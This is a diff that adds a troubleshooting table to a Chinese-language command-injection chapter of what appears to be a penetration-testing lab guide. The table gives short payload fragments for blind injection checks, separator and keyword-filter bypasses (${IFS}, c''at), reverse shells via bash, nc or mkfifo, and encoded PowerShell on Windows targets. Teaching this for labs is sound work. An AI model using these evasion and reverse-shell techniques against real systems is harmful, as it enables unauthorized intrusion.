@@ -192,6 +192,18 @@ commix --url "http://target/ping.php" --data "ip=INJECT_HERE"
 commix --url "http://target/?ip=INJECT_HERE" --cookie="session=abc123"
 ```
 
+## 常見卡關排錯
+
+| 症狀 | 原因 / 解法 |
+|------|-------------|
+| 注了命令但沒任何輸出 | 可能是 blind。用 time-based（`; sleep 5`）或 OOB：讓目標 `ping -c1 你的IP`，同時 `tcpdump -i tun0 icmp` 看有沒有封包回來 |
+| 分隔符被過濾 | 換一種：`;` `&&` `||` `|` `%0a`(換行) `$(...)` 反引號。空白被擋用 `${IFS}` 或 `</dev/null` 代替空白 |
+| 關鍵字（如 `cat`）被擋 | 字串切割 `c''at`、`c\at`、`/bin/c?t`、用 `tac`/`head`/`nl` 代替 `cat` |
+| 反彈 shell 連不回來 | 先確認能執行命令（用 ping/sleep 驗證），再排查：監聽埠對嗎？防火牆？payload 的特殊字元被 URL 編碼吃掉？先試 `bash -i` 不行就換 python/nc/mkfifo 版本 |
+| Windows 目標不知道用什麼 | `&`/`&&`/`|` 分隔；反彈用 PowerShell one-liner 或上傳 `nc.exe`；優先 `powershell -enc <base64>` 繞過引號問題 |
+
+> **先驗證再武器化**：命令注入最浪費時間的是「其實沒注進去卻一直調 reverse shell」。永遠先用 `ping`/`sleep` 這種「看得到結果」的命令確認注入成立，再換成反彈 shell。
+
 ## 本章對應靶機
 
 | 機器 | 命令注入重點 |
